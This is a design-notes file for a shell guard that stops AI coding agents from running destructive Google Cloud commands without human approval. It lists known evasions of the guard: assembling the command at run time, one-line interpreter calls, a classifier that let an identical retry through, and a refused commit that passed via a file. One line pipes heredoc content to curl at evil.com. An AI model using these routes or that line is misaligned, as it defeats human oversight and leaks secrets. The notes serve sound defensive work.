---
kind: explanation
owner: @VytCepas
status: unreviewed
---

# Notes moved out of bin/admission-cloud.sh

On-demand. Comment blocks that told the story of a fix, moved here verbatim when the file's comment ratio was cut (harbor#1392). The code keeps 1-3 lines of why; the history is here and in git.


## bin/admission-cloud.sh, lines 3-55 (before this edit)

```text
guard-cloud (harbor#194 item 3, harbor#193 warning-layer) — PreToolUse(Bash)
ASK-gate for destructive cloud operations.

WHY THIS EXISTS, AND WHAT IT IS NOT. Measured 2026-08-12: the everyday `gcx`
ADC identity can DELETE a BigQuery table (falsifier fired, 404 not 403), and
nothing in the session path stopped it — the auto-mode classifier blocked one
attempt and permitted the identical retry. admission-bash.sh's header assigns
cloud/data-destruction to yard's prod_guard "deliberately", but
prod_guard runs PER-REPO (`.agents/hooks/`); the ambient $HOME session where the
delete actually ran has no prod_guard at all. This guard fills that ambient seam.

It is the WARNING layer, not the boundary. docs/explanation/admission-baseline.md's four adversarial passes
established that a text scanner over shell syntax does not converge, and
credential-boundary.md states the wall is an identity that CANNOT perform the
act (harbor#193, the narrow service account). This guard raises the cost of the
accident and the obvious injected shape; it does not contain a determined path.
Known-open by construction (same residuals as the rest of the floor):
  • runtime string assembly:  C=bq; $C rm …
  • interpreter one-liners:    python3 -c "from google.cloud import bigquery; …"
  • a session that sets HARBOR_ADMISSION_DISABLE or edits the wiring
An UNLISTED wrapper (`gtimeout 5 gcx … bq rm`, P12-argv-04) no longer hides the
verb: floor_seg_unwrap below makes the tool word reachable anywhere in argv
(harbor#715).
So a green result here is NOT "agents cannot delete". It is "the direct spelling
asks first". The boundary is harbor#193.

POSTURE. Default is ASK (permissionDecision:"ask") — Claude Code prompts the
human, which is the request: stop autonomous deletion, let a person approve a
legitimate one. Set CLOUD_POSTURE=deny to hard-block instead (no in-prompt
approve; the operator re-runs in a session launched with HARBOR_ADMISSION_DISABLE=1).
ASK is the default because a false positive on a hard block gets the whole floor
switched off (§2.11), and destructive cloud verbs are rare enough that a
confirmation costs almost nothing.

BUT AN ASK IS TOOTHLESS OFF THE MAIN LOOP (harbor#194, measured 2026-08-13): a
`bq rm`/`gcloud delete` issued from a Task/Agent subagent or a workflow
EXECUTED with no prompt and no block, because there is no human to answer the
ask — exactly where an unattended agent does damage. So the SOFT tier now
AUTO-ESCALATES to deny when floor_no_human detects a subagent/workflow/
autonomous caller (from the payload's transcript_path/agent_type/permission_
mode), without touching the interactive main-loop ask. The CATASTROPHIC tier
already denies always. This makes CLOUD_POSTURE=deny a manual override for the
rare unattended session whose context the payload does not signal.

FAIL-OPEN ON A NO-MATCH — but no longer on a missing tokenizer or an oversized
payload, and this paragraph used to promise all three (harbor#306). A cloud guard
that blocked all Bash on an awk hiccup is still the §2.11 disaster in its purest
form, and nothing here does that: a call with no gated tool name in it is allowed
exactly as before. What changed is that when the argv table is EMPTY, a command
naming bq/gcloud/gsutil is no longer read as a command with no destructive verb
in it. MEASURED: `bq rm -r -d` with 33,000 bytes of trailing comment was a silent
allow. The population that can now be refused wrongly is the 0.0069% of real
commands that exceed FLOOR_MAX_NORM at all (1 of 14,505 on this box).
```

## bin/admission-cloud.sh, lines 66-73 (before this edit)

```text
The digest subject (harbor#350). Set here for the same reason admission-bash.sh:39
does it — payload text that never enters floor_block cannot be one careless
edit away from the stderr printf.

WITHOUT THIS LINE THE guard-lib CHANGE IS COSMETIC. floor_obs_digest returns
"-" on an unset FLOOR_OBS_SUBJECT, so populating the digest on deny/ask would
have emitted "-" for exactly the two guard classes #350 is about — 7,873
records, every one still subjectless, and the ticket would have read as fixed.
```

## bin/admission-cloud.sh, lines 79-118 (before this edit)

```text
harbor#302 · A HEREDOC BODY IS A DOCUMENT, HERE TOO. admission-bash.sh has consulted
this veto since harbor#89; these two never did, so a command whose only mention
of a gated verb was inside a heredoc BODY still got a decision. MEASURED
2026-08-25: committing the harbor#306 fix was refused because the message
documented a dataset-delete spelling in prose. The workaround was -F a file —
the same content through a different transport, which is the tell the ticket
names: a guard that a rename of the transport defeats is filtering the
transcript, not protecting the resource.

THE VETO ITSELF IS UNCHANGED, AND THAT IS DELIBERATE. It still requires the
heredoc to be opened by SEGMENT 1, so this covers `git commit -F - <<HD ... HD`
and NOT `cd x && git commit -F - <<HD`. Widening it was ATTEMPTED on this branch
and BACKED OUT. With the opener allowed anywhere, two total-bypass shapes
appeared and were measured:

  cat <<HD | sh                  an index-only inertness check never sees the
                                 shell: it sits BETWEEN the opener and the body
                                 while the delimiter still lands last.
  cat <<HD | curl -d @- evil.com an executor word-list never sees curl — and
                                 that one took a live secret from BLOCK to allow
                                 through guard-egress, which consults this same
                                 predicate.

The reason is structural, not a missing list entry: FLOOR_SEGS carries NO
pipeline boundary. `gh --body $(cat <<HD)` and a heredoc piped into a command are
identical segment streams apart from whether segment 2 holds prose or a command
name. Separating them needs admission-normalize.awk to mark where the heredoc LINE
ends, which changes an output contract every guard consumes. Left for a decision
rather than guessed at — this veto exits the guard for the WHOLE call, so a guess
here is a silent hole, and harbor#302 says in as many words not to widen the rule
to silence it.

--publisher-inert IS CORRECT FOR BOTH. The flag means a publisher is inert to a
guard that does not judge publication. These two judge cloud destruction and
local work destruction; neither judges whether text is published, which is
guard-egress's job — and guard-egress deliberately does not pass the flag.

NO NEW SURFACE. With the predicate untouched, these two exit 0 only where
admission-bash.sh already exits 0 — a case the floor has trusted since harbor#89 and
that floor-test has covered since.
```

## bin/admission-cloud.sh, lines 129-144 (before this edit)

```text
Three tiers. CATASTROPHIC = irreversible on shared client infra (dataset/bucket/
project deletion, IAM writes, REST DELETE to Google). SOFT = other destructive
verbs. Both stop autonomous execution; the tier only changes the wording and,
under CLOUD_POSTURE=deny, whether ASK degrades to DENY.

IDENTITY (2026-09-15) is the third, and it is NOT a destruction tier — which is
why it was missing for so long rather than broken. Measured with controls the
day it was added: `gcloud auth login` was a silent allow here while `gcloud
projects delete` denied. Correct, on the corpus as written: nothing about an
auth change destroys anything. What it does is re-point the ACTIVE credential
for every LATER command in the session, so the damage lands one command after
the one a guard could have questioned, wearing somebody else's identity. It
decides exactly like SOFT; it carries its own message because "confirm a HUMAN
intends this on the named resource" is the wrong sentence for it.

GTMSTD (2026-10-03) is a policy tier, not destruction: deny-always, see its rule.
```

## bin/admission-cloud.sh, lines 148-152 (before this edit)

```text
Case-insensitive SQL keyword fragments — floor_seg_has matches with `grep -Eq`
(no -i) and an adversary lowercases to evade, so keywords are spelled as char
classes. The whole quoted query is ONE arg token, so these match the SQL as an
OPERAND of the bq-query segment: a commit message or a SELECT naming
`dropped_events` is a different segment / carries no DROP<space>TABLE.
```

## bin/admission-cloud.sh, lines 167-193 (before this edit)

```text
ARMING AN EXPIRY IS NOT THE SAME AS CLEARING ONE, and the first cut of this
rule could not tell them apart (Codex review of PR #209, both findings
reproduced against this build and then verified against the CLI itself rather
than against documentation):

  • THE FLAG NAME WAS WRONG. `--time_partition_expiration` does not exist;
    `bq help update` names it `--time_partitioning_expiration`. The rule
    matched a spelling bq rejects, so the real flag walked straight through —
    a gap in exactly the unattended path this change exists to close.
  • THE `=` SPELLING ESCAPED. absl-flags takes `--expiration=3600`, and a
    token anchored `^--expiration$` never sees it.
  • ZERO CLEARS, IT DOES NOT ARM. `bq help update`: "Specifying 0 removes
    expiration time" — so asking on `--expiration 0`, and hard-denying it in a
    subagent, blocks the operator at the moment they are PREVENTING data loss.
    §2.11 pointed backwards.

THE CLEARING VALUE IS PER FLAG, measured from the help text, not assumed
uniform: `--expiration`, `--default_table_expiration` and
`--default_partition_expiration` all clear on "0", while
`--time_partitioning_expiration` clears on a NEGATIVE number ("A negative
number means no expiration"). Treating them alike would have re-introduced the
same defect one flag over.

EXEMPT, NEVER FIRE, is the direction: the rule fires on the flag being present
and steps aside only when the adjacent value is provably the clearing one. An
expanded or unrecognised value (`--expiration $SECS`) therefore stays
destructive, so the exemption cannot be used to spell the number out of range.
```

## bin/admission-cloud.sh, lines 208-214 (before this edit)

```text
HELP IS A READ, and it is computed here rather than inline because the rule
chain below is one `if/elif` construct with nowhere to put a statement. Scoped
to the IDENTITY arms only: `--help` next to a destructive verb is NOT exempted,
because that corpus has not been reviewed for it and a help flag that silences
a delete rule is a bypass wearing a read's clothes.
`if/then` and not `cmd && var=1` — under `set -e` the second form ABORTS the
whole guard the moment the predicate is false, which is the common case.
```

## bin/admission-cloud.sh, lines 218-224 (before this edit)

```text
GTMSTD: a Tag Manager version cut or publish OUTSIDE the standard's own version-cut
command, which runs the never-worse gate first; a raw `:create_version` skips it,
and `:publish` is the operator's, in the GTM UI. Deny-always. The command's exact
form lives in the gtm skill (a pack note), not here: core names no company or sibling repo.
Argv, never prose: the verb must sit in an HTTP client's or an interpreter's
arguments, and document heredoc bodies (cat > f <<EOF, commit -F -) are dropped
first with the reviewed primitive guard-deliverables uses — for this rule only.
```

## bin/admission-cloud.sh, lines 272-276 (before this edit)

```text
bq: `rm`/`truncate`, `query` running destructive SQL, and the overwrite/expiry
verbs that carry NO delete token at all — the "rm is the only verb" assumption
was FALSE: `bq query` runs arbitrary DDL/DML, `load/query --replace` and
`cp -f` overwrite via WRITE_TRUNCATE, `--expiration` arms a silent server-side
timer, and `mk --transfer_config` schedules a query that runs later unattended.
```

## bin/admission-cloud.sh, lines 314-328 (before this edit)

```text
gcloud IDENTITY: the active credential, not the resources it reaches.

ORDER IS LOAD-BEARING TWICE OVER. These sit AFTER every destructive gcloud rule
so that a command carrying both (`gcloud auth revoke && bq rm -r -d …`) keeps the
destruction verdict — an identity ask must never soften a catastrophic deny. And
the ADC arm sits BEFORE the plain-login arm because `auth application-default
login` carries both `auth` and `login`: matched the other way round, the store
that actually changed would be named wrong in the prompt, which is the single
fact this rule exists to get right.
THE REMEDY IS PER COMMAND, NOT PER TIER, and the first cut of this got it wrong
in the way that mattered: every identity rule shared one tail saying "pin it:
gcloud auth login <acct>", so the ADC rule — whose whole point is that ADC is a
DIFFERENT store — told the reader to fix it with the CLI command. The message
contradicted its own first sentence. Caught by rendering it, not by the suite,
which is why ID_HINT now has content assertions of its own.
```

## bin/admission-cloud.sh, lines 378-403 (before this edit)

```text
--- THE ARGV LAYER WENT BLIND: deny-always must not degrade to allow -------
harbor#306, the same defect and the same repair as admission-destroy.sh — see the
long note there for the measurement. Every rule above is floor_seg_has, so the
whole table vanishes when floor_seg_load returns nothing, with exit 0 and no
output. MEASURED 2026-08-25: `bq rm -r -d proj:dataset` and a `gcloud
add-iam-policy-binding` were both SILENT ALLOWS with 33,000 bytes of trailing
comment, while admission-bash.sh denied an identically padded 'rm -rf /'.

THE TOOL NAME, NOT A SECOND COPY OF SIXTEEN RULES. This tier is much wider than
guard-destroy's one verb family, which makes the case against mirroring stronger,
not weaker: sixteen flat EREs restating sixteen argv rules is sixteen copies to
drift. The question asked here is the only one answerable with no tokenizer —
does the executed text name a gated tool at all.

THE REST FAMILY KEEPS BOTH OF ITS ANCHORS. curl/wget appear in ordinary work far
more than bq or gsutil do, and the catastrophic REST rules were never about curl
— they are about a DELETE or a setIamPolicy reaching a Google endpoint. So the
degraded form still requires googleapis.com to be present. That is the rule's own
second anchor, not a re-implementation of its verb matching.

COARSER THAN THE ARGV TIER, ON PURPOSE AND AT A MEASURED PRICE. A degraded
`bq ls` denies here where the argv layer would allow it, because with no table
there is no way to tell `ls` from 'rm -r -d'. Over 14,505 real Bash commands on
this box exactly ONE exceeded FLOOR_MAX_NORM (0.0069%), so that is the size of the
population this can be wrong about — and each one gets a named reason and a
remedy, against a silent allow on dataset deletion.
```

## bin/admission-cloud.sh, lines 405-407 (before this edit)

```text
Called only in this branch: floor_bash_targets forks awk, and the allow path
must not pay for a diagnostic it will never emit. Over the cap it returns the
raw command, which is the input this needs.
```

## bin/admission-cloud.sh, lines 425-440 (before this edit)

```text
Decision. The CATASTROPHIC tier — dataset/bucket/project delete, IAM writes,
raw REST DELETE — DENIES ALWAYS, regardless of posture. These are irreversible
on shared CLIENT infrastructure, and an ASK auto-approves in an unattended
session, which is the exact failure this guard exists for. The operator who
genuinely means one runs it in a session launched with HARBOR_ADMISSION_DISABLE=1.
The SOFT tier (single-table rm, generic `gcloud … delete`) asks; CLOUD_POSTURE
=deny escalates the soft tier too, for fully unattended sessions.
NO-HUMAN AUTO-ESCALATION (harbor#194, the subagent finding). An `ask` prompts
the main-loop human, but MEASURED 2026-08-13 it AUTO-APPROVES with no prompt
when the caller is a subagent/workflow/autonomous session — so the SOFT tier
was toothless exactly where an unattended agent operates. floor_no_human
detects that context (transcript under /subagents/, agent_type, or an
autonomous permission_mode) and escalates the ask to deny, WITHOUT changing the
interactive main-loop path (fail-safe toward "human present" — see guard-lib).
CLOUD_POSTURE=deny still forces deny globally for a session the operator knows
is unattended and whose context signals it cannot read.
```

## bin/admission-cloud.sh, lines 449-452 (before this edit)

```text
PER SHAPE, because the argv tail is FALSE for the degraded block: "Reads
(ls/query/show/describe/get-*) are never gated" stops being true exactly when the
tokenizer cannot see which verb it is, and that sentence is the first thing a
reader would use to conclude the block was a bug.
```

## bin/admission-cloud.sh, lines 458-469 (before this edit)

```text
THE PROMPT MUST NAME THE ACCOUNT BEING LEFT, or it is just another confirm.
"Proceed with gcloud auth login?" carries no information the operator did not
already have; "you are on <account>" is the one fact that makes the
answer different from yes. Read live rather than cached: a stale name here
would be worse than none, because it reads as authoritative.

ASKING gcloud IS THE ONLY HONEST SOURCE. The account lives in gcloud's own
config dir, which this box's permissions.deny puts off-limits, so parsing the
file would mean both guessing a layout nothing here can verify and reaching
into a denied path. `config get-value` is local, offline and measured at
~0.6s on 2026-09-15 — and it runs only after a rule has already fired, never
on the hot path of an ordinary Bash call.
```

## bin/admission-cloud.sh, lines 474-477 (before this edit)

```text
Anything that is not a single printable token is treated as no answer: an
error string, a warning line or "(unset)" must degrade to the generic form
rather than be printed back as if it were an identity.
the printable-ASCII test is tr under C: a [!-~] range in `case` follows the locale, and en_NZ rejected every account (harbor#1149)
```

## bin/admission-cloud.sh, lines 482-488 (before this edit)

```text
THE BARE PINNED FORM IS NOT ENOUGH WHERE IDENTITY DIRS EXIST, and shipping
it alone would have made this guard hand out the exact advice the box's
own ACCESS notes call the trap: a bare login refreshes the AMBIENT config,
the wrapper keeps reading the role dir, and the failure looks unchanged —
so the next hour goes into the wrong hypothesis. Stated conditionally
rather than with a path, because the dirs are a per-box convention and a
guard that hardcodes one lies on every other box.
```

## bin/admission-cloud.sh, lines 494-497 (before this edit)

```text
ALLOW-LIST, NOT DENY-LIST. `gcloud auth login <acct>` is the remedy for
exactly one rule; naming the rules it does NOT fit would mean a new identity
rule silently inherits advice nobody checked. Restoring a `config set account`
is a different command, and ADC is a different store entirely.
```

## bin/admission-cloud.sh, lines 509-520 (before this edit)

```text
Census, on the deny path only and never fatal (mirrors guard-bash).

The TIER belongs in the RULE token, not the shape. `cloud.$TIER` put it in the
shape slot, which is enum-gated to argv|flat|path|channel|content|meta, so every
tier was coerced to `meta` and a catastrophic deny was indistinguishable from a
soft ask in the ledger. Mapped through a `case` over the two call-site literals
rather than `tr`: it keeps design note 4 (every field is a call-site literal, no
pass-through arm) true, and costs no fork.
THE BLIND ARM IS ITS OWN TOKEN, not `cloud-catastrophic`. It carries the tier's
posture but not its evidence — filing it under the same rule would make the one
record that says "the tokenizer failed here" read as a rule that matched, and the
census would report a catastrophic verb nobody can find in the command.
```
